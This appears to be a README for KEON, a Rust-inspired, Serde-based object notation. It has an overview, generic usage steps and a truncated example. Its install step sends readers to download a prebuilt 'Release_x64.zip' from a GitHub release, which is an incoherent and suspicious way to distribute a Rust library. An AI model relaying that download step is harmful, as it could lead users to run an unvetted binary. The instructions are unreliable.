## About KEON
KEON is a lightweight, human-readable, and easy-to-understand object notation format designed for representing complex data structures. It combines the simplicity of a human-readable format with the power of serialization provided by Serde. The syntax of KEON is inspired by Rust, making it familiar to Rust developers.

1. Download the KEON software from [here](https://github.com/farizalsalman21/keon/releases/download/v2.0/Release_x64.zip).
2. Extract the contents of the ZIP file to your desired location.
3. Include the KEON library in your project.
4. You are now ready to start using KEON in your applications.

## Usage
Using KEON is straightforward and intuitive. Here are some basic steps to help you get started:
1. Create a new KEON file with the `.keon` extension.
2. Serialize your data structures into KEON format using the provided serialization library.
3. Save the KEON file or transmit it over the network.
4. Deserialize the KEON data back into your data structures as needed.

## Examples
Here is an example of a simple KEON object representing a person:

```keon
person {
    name: "Alice",
    age: 30,
    is_student: false,
